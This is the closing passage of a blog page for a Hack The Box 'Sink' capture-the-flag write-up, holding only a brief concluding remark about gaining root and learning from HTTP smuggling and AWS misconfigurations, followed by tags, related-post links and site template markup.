<p>We are root on the box.</p>

<p>A Good Hack, lot of new learnings for me. HTTP Smuggling attack and AWS misconfigurations were similar to a recent attack which I have done on a real world network.</p>


      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        

        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/hackthebox/'>hackthebox</a>,
            <a href='/categories/linux/'>linux</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/hackthebox/"
            class="post-tag no-text-decoration" >hackthebox</a>
          
          <a href="/tags/insane/"
            class="post-tag no-text-decoration" >insane</a>
          
          <a href="/tags/smuggling/"
            class="post-tag no-text-decoration" >smuggling</a>
          
          <a href="/tags/haproxy/"
            class="post-tag no-text-decoration" >haproxy</a>
          
          <a href="/tags/gunicorn/"
            class="post-tag no-text-decoration" >gunicorn</a>
          
          <a href="/tags/aws/"
            class="post-tag no-text-decoration" >aws</a>
          
          <a href="/tags/gitea/"
            class="post-tag no-text-decoration" >gitea</a>
          
          <a href="/tags/git/"
            class="post-tag no-text-decoration" >git</a>
          
          <a href="/tags/containers/"
            class="post-tag no-text-decoration" >containers</a>
          
          <a href="/tags/docker/"
            class="post-tag no-text-decoration" >docker</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          <div class="license-wrapper">
          
            
            This post is licensed under 
            <a href="https://creativecommons.org/licenses/by/4.0/">
              CC BY 4.0
            </a>
             by the author.
          
          </div>

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Sink HTB - tinyb0y&url=/posts/Sink/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Sink HTB - tinyb0y&u=/posts/Sink/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=Sink HTB - tinyb0y&url=/posts/Sink/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')"
        data-toggle="tooltip" data-placement="top"
        title="Copy link">
    </i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->





<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

  















  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/active-directory/">active directory</a>
      
        
        <a class="post-tag" href="/tags/hacks/">hacks</a>
      
        
        <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
      
        
        <a class="post-tag" href="/tags/linux/">linux</a>
      
        
        <a class="post-tag" href="/tags/tryhackme/">tryhackme</a>
      
        
        <a class="post-tag" href="/tags/bof/">bof</a>
      
        
        <a class="post-tag" href="/tags/bufferoverflow/">bufferoverflow</a>
      
        
        <a class="post-tag" href="/tags/easy/">easy</a>
      
        
        <a class="post-tag" href="/tags/hard/">hard</a>
      
        
        <a class="post-tag" href="/tags/htb/">htb</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  
    <!-- BS-toc.js will be loaded at medium priority -->
    <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
      <span class="pl-3 pt-2 mb-2">Contents</span>
      <nav id="toc" data-toggle="toc"></nav>
    </div>
  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/Breadcrumbs/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->






<span class="timeago small"
  >Jul 13<i class="unloaded">2021-07-13T05:30:00+05:30</i>
</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Breadcrumbs HTB</h3>
            <div class="text-muted small">
              <p>
                





                Nmap
# Nmap done at Tue Jul 13 04:06:21 2021 -- 1 IP address (1 host up) scanned in 49.05 seconds
root@kali:~/ctf/htb/Breadcrumbs/10.129.163.3/nmap# 
root@kali:~/ctf/htb/Breadcrumbs/10.129.163.3/nm...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/Mantis/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->






<span class="timeago small"
  >Jul 23<i class="unloaded">2021-07-23T05:30:00+05:30</i>
</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Mantis HTB</h3>
            <div class="text-muted small">
              <p>
                





                Mantis

Mantis was one of those Windows targets where it’s just a ton of enumeration until you get a System shell. The exploit is where a low level user was allowed to make a privileged Kerberos ti...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/Inception/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->






<span class="timeago small"
  >Jul 12<i class="unloaded">2021-07-12T00:00:00+05:30</i>
</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Inception HTB</h3>
            <div class="text-muted small">
              <p>
                





                Nmap

---------------------Starting Script Scan-----------------------                        
PORT     STATE SERVICE    VERSION                                                   80/tcp   open  htt...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/Reel/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Reel HTB</p>
  </a>
  

  
  <a href="/posts/Split/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>ROP Emporium Split Pwn</p>
  </a>
  

</div>


    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2021
        <a href="https://twitter.com/t1nyb0y">tinyb0y</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        

        

        Powered by 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
         with 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
         theme.

      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/active-directory/">active directory</a>
      
        
        <a class="post-tag" href="/tags/hacks/">hacks</a>
      
        
        <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
      
        
        <a class="post-tag" href="/tags/linux/">linux</a>
      
        
        <a class="post-tag" href="/tags/tryhackme/">tryhackme</a>
      
        
        <a class="post-tag" href="/tags/bof/">bof</a>
      
        
        <a class="post-tag" href="/tags/bufferoverflow/">bufferoverflow</a>
      
        
        <a class="post-tag" href="/tags/easy/">easy</a>
      
        
        <a class="post-tag" href="/tags/hard/">hard</a>
      
        
        <a class="post-tag" href="/tags/htb/">htb</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    
      <!--
  mermaid-js loader
-->

<script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script>
<script>
  $(function() {
    let initTheme = "default";

    if ($("html[mode=dark]").length > 0
      || ($("html[mode]").length == 0
        && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) {
      initTheme = "dark";
    }

    let mermaidConf = {
      theme: initTheme  /* <default|dark|forest|neutral> */
    };

    /* Markdown converts to HTML */
    $("pre").has("code.language-mermaid").each(function() {
      let svgCode = $(this).children().html();
      $(this).addClass("unloaded");
      $(this).after(`<div class=\"mermaid\">${svgCode}</div>`);
    });

    mermaid.initialize(mermaidConf);
  });
</script>

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup -->
  <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>


  <!-- MathJax -->
  <script>
  /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */
  MathJax = {
    tex: {
      inlineMath: [              /* start/end delimiter pairs for in-line math */
        ['$','$'],
        ['\\(','\\)']
      ],
      displayMath: [             /* start/end delimiter pairs for display math */
        ['$$', '$$'],
        ['\\[', '\\]']
      ]
    }
  };
  </script>
  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
  <script type="text/javascript" id="MathJax-script" async
    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
  </script>


<!-- commons -->

<script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>




  </body>

</html>

